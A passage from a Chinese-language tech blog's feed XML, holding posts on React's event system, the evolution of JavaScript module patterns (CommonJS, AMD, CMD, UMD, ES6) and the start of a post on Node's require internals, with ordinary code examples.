class="line">evt.initEvent(evtType, false, false);</span><br><span class="line">fakeNode.dispatchEvent(evt);</span><br></pre></td></tr></table></figure><p>dispatchInteractiveEvent-&gt;interactiveUpdates-&gt;runExtractedEventsInBatch-&gt;runEventsInBatch-&gt;循环执行所有绑定的事件</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>React事件系统为了兼容各种版本的浏览器而做了大量工作，与原生事件不同的点，只在于React对事件进行统一而不是分散的存储与管理，捕获事件后内部生成合成事件提高浏览器的兼容度，执行回调函数后再进行销毁释放内存，从而大大提高网页的响应性能。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;（针对v16.4.0）&lt;/p&gt;
&lt;h3 id=&quot;原生事件系统&quot;&gt;&lt;a href=&quot;#原生事件系统&quot; class=&quot;headerlink&quot; title=&quot;原生事件系统&quot;&gt;&lt;/a&gt;原生事件系统&lt;/h3&gt;&lt;p&gt;我们通常监听真实DOM。举🌰来说，我们想监听按钮的点击事件，那么我们
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>关于js模块化</title>
    <link href="http://swingboy.github.io/2018/07/14/%E5%85%B3%E4%BA%8Ejs%E6%A8%A1%E5%9D%97%E5%8C%96/"/>
    <id>http://swingboy.github.io/2018/07/14/关于js模块化/</id>
    <published>2018-07-14T13:52:22.000Z</published>
    <updated>2020-04-24T03:20:05.096Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ABOUT-JS模块"><a href="#ABOUT-JS模块" class="headerlink" title="ABOUT JS模块"></a>ABOUT JS模块</h1><h2 id="1、引言-背景"><a href="#1、引言-背景" class="headerlink" title="1、引言-背景"></a>1、引言-背景</h2><p>模块化这个问题并非一开始就存在，WWW刚刚问世的时候，html，JavaScript，CSS都是极其简单的存在，并不需要模块化。</p><h4 id="1-1-模块化的需求是规模的产物"><a href="#1-1-模块化的需求是规模的产物" class="headerlink" title="1.1 模块化的需求是规模的产物"></a>1.1 模块化的需求是规模的产物</h4><p>当web page进化到web application，浏览器端处理的逻辑越来越复杂，展现的样式和动画越来越多，业务逻辑也越来越复杂，对于工程的要求也就越来越高。于是模块化的需求也就产生了。</p><h4 id="1-2-什么是模块化-？"><a href="#1-2-什么是模块化-？" class="headerlink" title="1.2 什么是模块化 ？"></a>1.2 什么是模块化 ？</h4><p>模块化是一种将系统分离成独立功能部分的方法，可将系统分割成独立的功能部分，严格定义模块接口、模块间具有透明性。</p><h4 id="1-3-为什么要使用模块"><a href="#1-3-为什么要使用模块" class="headerlink" title="1.3 为什么要使用模块 ?"></a>1.3 为什么要使用模块 ?</h4><p>模块化可以使你的代码低耦合，功能模块直接不相互影响。<br>模块化是工程化的需求，是为了更好的管理代码</p><h2 id="2、历程（进化与类举）"><a href="#2、历程（进化与类举）" class="headerlink" title="2、历程（进化与类举）"></a>2、历程（进化与类举）</h2><h4 id="无模块"><a href="#无模块" class="headerlink" title="无模块"></a>无模块</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if(xx)&#123;</span><br><span class="line">     //.......</span><br><span class="line">&#125;else&#123;</span><br><span class="line">     //xxxxxxxxxxx</span><br><span class="line">&#125;</span><br><span class="line">for(var i=0; i&lt;10; i++)&#123;</span><br><span class="line">     //todo</span><br><span class="line">&#125;</span><br><span class="line">element.onclick = function()&#123;</span><br><span class="line">     //todo</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>特点：代码简单的堆在一起，只要能从上往下依次执行就可以了。</p></blockquote><h4 id="模块萌芽"><a href="#模块萌芽" class="headerlink" title="模块萌芽"></a>模块萌芽</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function m1()&#123; </span><br><span class="line">　　//... </span><br><span class="line">&#125; </span><br><span class="line">function m2()&#123; </span><br><span class="line">    //... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这时的模块就是实现特定功能的一组方法。把不同的函数（以及记录状态的变量）简单地放在一起，就算是一个模块。 </p></blockquote><blockquote><p>上面的函数m1()和m2()，组成一个模块。使用的时候，直接调用就行了。<br>缺点也很明显：”污染”了全局变量，无法保证不与其他模块发生变量名冲突，而且模块成员之间看不出直接关系。 </p></blockquote><h4 id="对象写法"><a href="#对象写法" class="headerlink" title="对象写法"></a>对象写法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var module1 = new Object(&#123; </span><br><span class="line">_count : 0, </span><br><span class="line">　　m1 : function ()&#123; </span><br><span class="line">　　//... </span><br><span class="line">　　&#125;, </span><br><span class="line">　　m2 : function ()&#123; </span><br><span class="line">　　//... </span><br><span class="line">　　&#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>上面的函数m1()和m2(），都封装在module1对象里。使用的时候，就是调用这个对象的属性。<br>但是，这样的写法会暴露所有模块成员，内部状态可以被外部改写(_count ++ 操作)（当然也包括内部的方法）。</p></blockquote><h4 id="立即执行函数写法"><a href="#立即执行函数写法" class="headerlink" title="立即执行函数写法"></a>立即执行函数写法</h4><p>使用”立即执行函数”，可以达到不暴露私有成员的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var module1 = (function()&#123; </span><br><span class="line">　　var _count = 0; </span><br><span class="line">　　var m1 = function()&#123; </span><br><span class="line">　　//... </span><br><span class="line">　　&#125;; </span><br><span class="line">　　var m2 = function()&#123; </span><br><span class="line">　　//... </span><br><span class="line">&#125;; </span><br><span class="line">　　return &#123; </span><br><span class="line">　　m1 : m1, </span><br><span class="line">　　m2 : m2 </span><br><span class="line">　　&#125;; </span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><blockquote><p>问题：使用上面的写法，外部代码无法读取内部的_count变量。<br>module1就是Javascript模块的基本写法。等下，再对这种写法进行加工。<br>此时的模块化思想已经成型</p></blockquote><h3 id="还有一些其他的写法-如："><a href="#还有一些其他的写法-如：" class="headerlink" title="还有一些其他的写法, 如："></a>还有一些其他的写法, 如：</h3><h4 id="放大模式"><a href="#放大模式" class="headerlink" title="放大模式"></a>放大模式</h4><p>如果一个模块很大，必须分成几个部分，或者一个模块需要继承另一个模块，这时就有必要采用”放大模式”（augmentation）。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var module1New = (function (mod)&#123; </span><br><span class="line">mod.m3 = function () &#123; </span><br><span class="line">　　//... </span><br><span class="line">　　&#125;; </span><br><span class="line">　　return mod; </span><br><span class="line">&#125;)(module1);</span><br></pre></td></tr></table></figure><blockquote><p>上面的代码为module1模块添加了一个新方法m3()，然后返回新的module1模块。 </p></blockquote><h4 id="宽放大模式"><a href="#宽放大模式" class="headerlink" title="宽放大模式"></a>宽放大模式</h4><blockquote><p>在浏览器环境中，模块的各个部分通常都是从网络上获取的，有时无法知道哪个部分会先加载。如果采用上一节的写法，第一个执行的部分有可能加载一个不存在空对象，这时就要采用”宽放大模式”。 </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var module1 = ( function (mod)&#123; </span><br><span class="line">//... </span><br><span class="line">　　return mod; </span><br><span class="line">&#125;)(window.module1 || &#123;&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>与”放大模式”相比，＂宽放大模式＂就是”立即执行函数”的参数可以是空对象。 </p></blockquote><h4 id="输入全局变量"><a href="#输入全局变量" class="headerlink" title="输入全局变量"></a>输入全局变量</h4><p>独立性是模块的重要特点，模块内部最好不与程序的其他部分直接交互。<br>为了在模块内部调用全局变量，必须显式地将其他变量输入模块。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var module1 = (function ($, Tatami) &#123; </span><br><span class="line">//... </span><br><span class="line">&#125;)(jQuery, Ttm);</span><br></pre></td></tr></table></figure><blockquote><p>上面的module1模块需要使用jQuery和Ttm，就把这两个库（其实是两个模块）当作参数输入module1。这样做除了保证模块的独立性，还使得模块之间的依赖关系变得明显。</p></blockquote><h3 id="3、模块化的推进与繁荣"><a href="#3、模块化的推进与繁荣" class="headerlink" title="3、模块化的推进与繁荣"></a>3、模块化的推进与繁荣</h3><p><a href="https://blog.csdn.net/Real_Bird/article/details/54869066" target="_blank" rel="noopener">各种现代模块推演</a></p><p>js模块化编程，已经成为一个迫切的需求。理想情况下，开发者只需要实现核心的业务逻辑，其他都可以加载别人已经写好的模块。</p><h4 id="各种标准出现了（CommonJS、AMD、CMD、UMD、ES6）"><a href="#各种标准出现了（CommonJS、AMD、CMD、UMD、ES6）" class="headerlink" title="各种标准出现了（CommonJS、AMD、CMD、UMD、ES6）"></a>各种标准出现了（CommonJS、AMD、CMD、UMD、ES6）</h4><p><img src="/imgs/关于js模块化/module_pic.png" alt></p><h4 id="3-1-commonJS-Node"><a href="#3-1-commonJS-Node" class="headerlink" title="3.1 commonJS(Node)"></a>3.1 commonJS(Node)</h4><p><a href="http://javascript.ruanyifeng.com/nodejs/module.html" target="_blank" rel="noopener">阮老师 commonJS module</a></p><p>CommonJS是一个更偏向于服务器端的规范。CommonJS的一个模块就是一个脚本文件。require命令第一次加载该脚本时就会执行整个脚本，然后在内存中生成一个对象(如下)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  id: &apos;...&apos;,</span><br><span class="line">  exports: &#123; ... &#125;,</span><br><span class="line">  loaded: true,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>以后需要用到这个模块时，就会到exports属性上取值。即使再次执行require命令，也不会再次执行该模块，而是到缓存中取值。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//math.js</span><br><span class="line">exports.add = function() &#123;</span><br><span class="line">    var sum = 0, i = 0, args = arguments, l = args.length;</span><br><span class="line">    while (i &lt; l) &#123;</span><br><span class="line">        sum += args[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    return sum;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//increment.js</span><br><span class="line">var add = require(&apos;math&apos;).add;</span><br><span class="line">exports.increment = function(val) &#123;</span><br><span class="line">    return add(val, 1);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于CommonJS是同步加载模块，这对于服务器端不是一个问题，因为所有的模块都放在本地硬盘。等待模块时间就是硬盘读取文件时间，很小。但是，对于浏览器而言，它需要从服务器加载模块，涉及到网速，代理等原因，一旦等待时间过长，浏览器处于”假死”状态。</p><p>所以在浏览器端，不适合于CommonJS规范。所以在浏览器端又出现了一个规范——AMD。</p><h4 id="3-2-AMD-requireJs"><a href="#3-2-AMD-requireJs" class="headerlink" title="3.2 AMD(requireJs)"></a>3.2 AMD(requireJs)</h4><p>AMD(Asynchronous Module Definition)异步模块定义。异步强调的是，在加载模块以及模块所依赖的其它模块时，都采用异步加载的方式，避免模块加载阻塞了网页的渲染进度。</p><p>模块定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define([module-name?], [array-of-dependencies?], [module-factory-or-object]);</span><br></pre></td></tr></table></figure><blockquote><p>id：模块的名字，如果没有提供该参数，模块的名字应该默认为模块加载器请求的指定脚本的名字；<br>dependencies：模块的依赖，已被模块定义的模块标识的数组字面量。<br>factory：模块的工厂函数，模块初始化要执行的函数或对象。  </p></blockquote><p>AMD也采用require命令加载模块，但是不同于CommonJS，它要求两个参数：</p><p>require([module], callback);</p><blockquote><p>第一个参数[module]，是一个数组，里面的成员是要加载的模块，callback是加载完成后的回调函数。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// math.js</span><br><span class="line">define(function() &#123;</span><br><span class="line">  var add = function(x, y) &#123;</span><br><span class="line">    return x + y;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return  &#123;</span><br><span class="line">    add: add</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// main.js</span><br><span class="line">require([&apos;math&apos;], function(math) &#123;</span><br><span class="line">  //</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>当require()加载math模块的时候，就会先加载它依赖的模块。当有多个依赖时，就将所有的依赖都写在define()函数第一个参数数组中，所以说AMD是依赖前置的。这不同于CMD规范，它是依赖就近的。</p></blockquote><p><a href="https://github.com/creeperyang/amd-loader" target="_blank" rel="noopener">AMD加载的实现</a></p><h4 id="3-3-CMD-seaJS"><a href="#3-3-CMD-seaJS" class="headerlink" title="3.3 CMD(seaJS)"></a>3.3 CMD(seaJS)</h4><p>CMD（即Common Module Definition通用模块定义）</p><p>CMD推崇依赖就近，延迟执行。可以把你的依赖写进代码的任意一行，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(factory)</span><br></pre></td></tr></table></figure><p>factory为函数时，表示是模块的构造方法。执行该构造方法，可以得到模块向外提供的接口。factory 方法在执行时，默认会传入三个参数：require、exports 和 module.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">define(function(require, exports, module) &#123;</span><br><span class="line">  var a = require(&apos;./a&apos;);</span><br><span class="line">  a.doSomething();</span><br><span class="line">  var b = require(&apos;./b&apos;);</span><br><span class="line">  b.doSomething();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>因为CMD推崇一个文件一个模块，所以经常就用文件名作为模块id<br>CMD推崇依赖就近，所以一般不在define的参数中写依赖，在factory中写。<br>sea.js通过sea.use()来加载模块。 seajs.use(id, callback?)</p></blockquote><h5 id="AMD与CMD-区别联系"><a href="#AMD与CMD-区别联系" class="headerlink" title="AMD与CMD 区别联系"></a>AMD与CMD 区别联系</h5><p>SeaJS要解决的问题和requireJS一样，只不过在模块定义方式和模块加载（可以说运行、解析）时机上有所不同。</p><p>AMD和CMD都是用define和require。</p><p>CMD标准倾向于在使用过程中提出依赖，就是不管代码写到哪突然发现需要依赖另一个模块，那就在当前代码用require引入就可以了，规范会帮你搞定预加载，你随便写就可以了。但是AMD标准让你必须提前在头部依赖参数部分写好。</p><p>虽然都是并行加载js文件，但还是有所区别，AMD是预加载，在并行加载js文件同时，还会解析执行该模块（因为还需要执行，所以在加载某个模块前，这个模块的依赖模块需要先加载完成）；而CMD是懒加载，虽然会一开始就并行加载js文件，但是不会执行，而是在需要的时候才执行。</p><p>AMD优点：加载快速，尤其遇到多个大文件，因为并行解析，所以同一时间可以解析多个文件。</p><p>AMD缺点：并行加载，异步处理，加载顺序不一定，可能会造成一些困扰，甚至为程序埋下大坑。</p><p>CMD优点：因为只有在使用的时候才会解析执行js文件，因此，每个JS文件的执行顺序在代码中是有体现的，是可控的。</p><p>CMD缺点：执行等待时间会叠加。因为每个文件执行时是同步执行（串行执行），因此时间是所有文件解析执行时间之和，尤其在文件较多较大时，这种缺点尤为明显。</p><h4 id="3-4-UMD-Universal-Module-Definition-通用模块定义"><a href="#3-4-UMD-Universal-Module-Definition-通用模块定义" class="headerlink" title="3.4 UMD (Universal Module Definition 通用模块定义)"></a>3.4 UMD (Universal Module Definition 通用模块定义)</h4><p>既然CommonJs和AMD风格一样流行，似乎缺少一个统一的规范。所以产生了这样的需求，希望有支持两种风格的“通用”模式，于是通用模块规范（UMD）诞生了。</p><blockquote><p>UMD希望提供一个前后端跨平台的解决方案(支持AMD与CommonJS模块方式)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(function (root, factory) &#123;</span><br><span class="line">    if (typeof define === &apos;function&apos; &amp;&amp; define.amd) &#123;</span><br><span class="line">        // AMD</span><br><span class="line">        define([&apos;jquery&apos;, &apos;underscore&apos;], factory);</span><br><span class="line">    &#125; else if (typeof exports === &apos;object&apos;) &#123;</span><br><span class="line">        // Node, CommonJS之类的</span><br><span class="line">        module.exports = factory(require(&apos;jquery&apos;), require(&apos;underscore&apos;));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 浏览器全局变量(root 即 window)</span><br><span class="line">        root.returnExports = factory(root.jQuery, root._);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;(this, function ($, _) &#123;</span><br><span class="line">    function a()&#123;&#125;; </span><br><span class="line">    function b()&#123;&#125;; </span><br><span class="line">    function c()&#123;&#125;;</span><br><span class="line">    return &#123;</span><br><span class="line">        b: b,</span><br><span class="line">        c: c</span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><blockquote><p>先判断是否支持Node.js模块格式（exports是否存在），存在则使用Node.js模块格式。<br>再判断是否支持AMD（define是否存在），存在则使用AMD方式加载模块。<br>前两个都不存在，则将模块公开到全局（window或global）。  </p></blockquote><p>更多有关UMD的例子在Github上的<a href="https://github.com/umdjs/umd" target="_blank" rel="noopener">官方repo</a></p><h4 id="3-5-ES6-终极boss"><a href="#3-5-ES6-终极boss" class="headerlink" title="3.5 ES6 终极boss"></a>3.5 ES6 终极boss</h4><p>新的、我们在用的东西、新规范、代表未来、牛逼。</p><blockquote><p>es6 模块新的标准在设计上是兼容已经存在的CommonJS和AMD模块的。</p></blockquote><p>es6通过import、export实现模块的输入输出。import命令用于输入其他模块提供的功能，export命令用于规定模块的对外接口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//a.js</span><br><span class="line">export &#123;a, b, c&#125;;</span><br><span class="line"></span><br><span class="line">//b.js</span><br><span class="line">import &#123;a, b, c &#125; from &apos;a.js&apos;;</span><br><span class="line"></span><br><span class="line">//expt.js</span><br><span class="line">export function abc()&#123;&#125;//export 一个命名的function  </span><br><span class="line">export default function()&#123;&#125; //export default function  </span><br><span class="line">export num = 123 //export 一个数值  </span><br><span class="line">export obj = &#123;&#125;  </span><br><span class="line">export &#123; obj as default &#125;;</span><br><span class="line"></span><br><span class="line">//import</span><br><span class="line">import expt from &apos;expt&apos;//default export  </span><br><span class="line">import &#123;default as myModule&#125; from &apos;expt&apos; //rename  </span><br><span class="line">import &#123;abc,num,obj&#125; from &apos;expt&apos;</span><br></pre></td></tr></table></figure><p>你可能要注意的地方：</p><ul><li>所有的import和export只能写在顶级作用域中。你不能在条件判断语句和函数作用域内使用import。</li><li>所有导出的变量名必须是显式的，你不能通过遍历一个数组，动态生成一组导出名进行导出。</li><li>模块对象都是被冻结的，不能通过polyfill为它添加新的特性。</li><li>对于import的错误，无法进行recovery。一个应用可能依赖许多的模块，一旦有一个模块加载失败，这个应用都不会运行。你不能在try/catch中使用import。正是因为es6的模块表现得如此静态，webpack才能在编译的时候检测出代码中的错误。</li><li>你没法为一个模块在加载所有依赖项之前添加钩子，这意味着一个模块没有办法控制其依赖项的加载方式</li></ul><p>只举一个例子  like …</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    import es6 from &apos;./es6.js&apos;;</span><br><span class="line">&#125; catch (error) &#123;</span><br><span class="line">    console.log(error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://es6.ruanyifeng.com/#docs/module" target="_blank" rel="noopener">阮老师关于module</a>  </p><h5 id="再看一把es6与commonjs区别"><a href="#再看一把es6与commonjs区别" class="headerlink" title="再看一把es6与commonjs区别"></a>再看一把es6与commonjs区别</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">es6 &#123;</span><br><span class="line">　　export: &apos;可以输出多个，输出方式为 &#123;&#125;&apos; ，</span><br><span class="line">　　export  default : &apos; 只能输出一个 ，可以与export 同时输出，但是不建议这么做&apos;，</span><br><span class="line">　　解析阶段确定对外输出的接口，解析阶段生成接口，</span><br><span class="line">　　模块不是对象，加载的不是对象，</span><br><span class="line">　　可以单独加载其中的某个接口（方法），</span><br><span class="line">　　静态分析，动态引用，输出的是值的引用，值改变，引用也改变，即原来模块中的值改变则该加载的值也改变，</span><br><span class="line">　　this 指向undefined</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">commonJS &#123;</span><br><span class="line">　　module.exports =  xxx : &apos;只能输出一个，且后面的会覆盖上面的&apos; ，</span><br><span class="line">　　exports.  xxx : &apos; 可以输出多个&apos;，</span><br><span class="line">　　运行阶段确定接口，运行时才会加载模块，</span><br><span class="line">　　模块是对象，加载的是该对象，</span><br><span class="line">　　加载的是整个模块，即将所有的接口全部加载进来，</span><br><span class="line">　　输出是值的拷贝，即原来模块中的值改变不会影响已经加载的该值，</span><br><span class="line">　　this 指向当前模块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://caibaojian.com/es6/module.html" target="_blank" rel="noopener">commonjs与es6区别</a></p><blockquote><p>在结合es6模块和commonJS模块的区别之后，我们知道es6的特点是静态解析，而commonJS模块的特点是动态解析的，因此，借于es6模块的静态解析，tree-shaking的实现才能成为可能。</p></blockquote><h4 id="3-6-目前的我们—-少不了webpack"><a href="#3-6-目前的我们—-少不了webpack" class="headerlink" title="3.6 目前的我们—-少不了webpack"></a>3.6 目前的我们—-少不了webpack</h4><p>虽然不算是模块化规范，但是为我们解决模块问题提供了极大帮助。</p><p><a href>webpack模块化原理 见下文</a></p><h3 id="4、拨开云雾"><a href="#4、拨开云雾" class="headerlink" title="4、拨开云雾"></a>4、拨开云雾</h3><p>模块的本质：模块化相当于闭包开发， 接口导出就相当于将父函数（模块）内的子函数给暴漏到父函数外。</p><h3 id="5、总结必备"><a href="#5、总结必备" class="headerlink" title="5、总结必备"></a>5、总结必备</h3><h4 id="5-1-模块化的优缺点："><a href="#5-1-模块化的优缺点：" class="headerlink" title="5.1 模块化的优缺点："></a>5.1 模块化的优缺点：</h4><h5 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h5><p>(1)可维护性  </p><ul><li>灵活架构，焦点分离  </li><li>方便模块间组合、分解   </li><li>方便单个模块功能调试、升级  </li><li>多人协作互不干扰  </li></ul><p>(2)可测试性  </p><ul><li>可分单元测试  </li></ul><h5 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h5><p>性能损耗  </p><ul><li>系统分层，调用链会很长  </li><li>模块间通信,模块间发送消息会很耗性能  </li></ul><h4 id="5-2-模块化的意义"><a href="#5-2-模块化的意义" class="headerlink" title="5.2 模块化的意义"></a>5.2 模块化的意义</h4><ul><li>组件的复用，降低开发成本和维护成本</li><li>组件单独开发，方便分工合作</li><li>模块化遵循标准，方便自动化依赖管理，代码优化，部署</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ABOUT-JS模块&quot;&gt;&lt;a href=&quot;#ABOUT-JS模块&quot; class=&quot;headerlink&quot; title=&quot;ABOUT JS模块&quot;&gt;&lt;/a&gt;ABOUT JS模块&lt;/h1&gt;&lt;h2 id=&quot;1、引言-背景&quot;&gt;&lt;a href=&quot;#1、引言-背景&quot; class
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>node require与webpack模块化原理</title>
    <link href="http://swingboy.github.io/2018/06/18/node%20require%E4%B8%8Ewebpack%E6%A8%A1%E5%9D%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
    <id>http://swingboy.github.io/2018/06/18/node require与webpack模块化原理/</id>
    <published>2018-06-18T13:57:29.000Z</published>
    <updated>2019-11-23T14:30:35.416Z</updated>
    
    <content type="html"><![CDATA[<h2 id="about-node-require"><a href="#about-node-require" class="headerlink" title="about node require"></a>about node require</h2><p>首先：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//node 模块代码</span><br><span class="line">var a = &#123;&#125;;</span><br><span class="line">module.exports = a;</span><br></pre></td></tr></table></figure><p>问题：在node执行的时候会发现，代码变成了这样子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(function (exports, require, module, __filename, __dirname) &#123;</span><br><span class="line">    var a = &#123;&#125;;</span><br><span class="line">    module.exports = a;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>可以看到，我们的模块代码在运行的时候是被包裹了一层的，而上面列的这些变量正是在这个包裹函数中作为形参传入的。<br>其中module指向模块本身，module.exports和exports是等价的，表示模块要导出供调用的内容</p></blockquote><h2 id="require的内部处理流程"><a href="#require的内部处理流程" class="headerlink" title="require的内部处理流程"></a>require的内部处理流程</h2><p>先上<a href="https://github.com/nodejs/node/blob/v5.x/lib/module.js" target="_blank" rel="noopener">代码</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// Loads a module at the given file path. Returns that module&apos;s</span><br><span class="line">// `exports` property.</span><br><span class="line">Module.prototype.require = function (path) &#123;</span><br><span class="line">    assert(path, &apos;missing path&apos;);</span><br><span class="line">    assert(typeof path === &apos;string&apos;, &apos;path must be a string&apos;);</span><br><span class="line">    return Module._load(path, this, /* isMain */ false);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>require命令是CommonJS规范之中，用来加载其他模块的命令。它其实不是一个全局命令，而是指向当前模块的module.require命令，而后者又调用Node的内部命令Module._load。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Module._load = function(request, parent, isMain) &#123;</span><br><span class="line">// .....</span><br><span class="line"></span><br><span class="line">return module.exports;</span><br><span 